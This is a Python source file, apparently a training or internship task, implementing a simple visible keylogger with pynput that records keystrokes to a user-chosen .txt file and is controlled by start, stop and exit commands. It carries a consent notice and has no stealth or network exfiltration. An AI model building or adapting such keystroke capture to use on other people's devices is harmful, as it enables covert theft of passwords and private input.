'''
Task-04      : Simple Keylogger
File Name    : Prasunet_CS_04
Organization : Prasunet Pvt.Ltd. Company

'''

from pynput import keyboard   # Import the keyboard module from the pynput library to capture keyboard events
import logging                # Import the logging module to handle logging keystrokes to a file
import os                     # Import the os module to handle file paths and system operations(optional)

# Global variable to control logging state
logging_enabled = False

# Function to handle key press events when logging is enabled 
def on_press(key):
 
    if logging_enabled:
        try:
            # Log the character of the key pressed
            logging.info(f'Key pressed: {key.char}')
        except AttributeError:
            # Log special keys (e.g., Shift, Ctrl, etc.)
            logging.info(f'Special key pressed: {key}')

# Function to handle key release events when logging is enabled
def on_release(key):
 
    if key == keyboard.Key.esc and logging_enabled:
        return False

# Function to begin logging
def start_logging():
   
    global logging_enabled
    logging_enabled = True
    print("\n[INFO] Logging started.")
    logging.info("Logging started.")

#Function to stop logging
def stop_logging():
   
    global logging_enabled
    logging_enabled = False
    print("\n[INFO] Logging stopped.")
    logging.info("Logging stopped.")

#Main Function to control the keylogger
def main():
 
    # Display program title
    print("\n" + "="*60)
    print("\t\tWelcome to the Keylogger Program")
    print("="*60)
    print("""\n*Note: This program logs keystrokes and saves them to a file
       of your choice. Please use this program responsibly
       and only with proper consent.""")
    print("\n"+"-"*60)
    
    # Prompt user for log file path
    while True:
        log_file = input("\n-> Enter the filename to save the log (e.g., 'keylog.txt'): ").strip()
        
        # Check if the log file ends with '.txt'
        if not log_file.endswith(".txt"):
            print("\n[WARNING] Please enter a valid filename with the '.txt' extension.")
            continue  # Prompt again for correct input
        else:
            break

    logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')
    
    # Confirm log file location to the user
    print(f"\n[INFO] Successful! Keystrokes will be logged in: {os.path.abspath(log_file)}")

    # Create and start the key listener
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()

    try:
        while True:
            # Prompt user for command
            user_input = input("\n-> Enter 'start' to begin logging, 'stop' to end logging, 'exit' to quit: ").strip().lower()
            if user_input == 'start' and not logging_enabled:
                start_logging()
            elif user_input == 'stop' and logging_enabled:
                stop_logging()
            elif user_input == 'exit':
                if logging_enabled:
                    stop_logging()
                break
            else:
                print("\n[ERROR] Invalid input. Please enter 'start', 'stop', or 'exit'.")
        print("\n"+"-"*60)
        print("\nExiting the Keylogger Program. Goodbye!\n")
    finally:
        listener.stop()

if __name__ == "__main__":
    main()
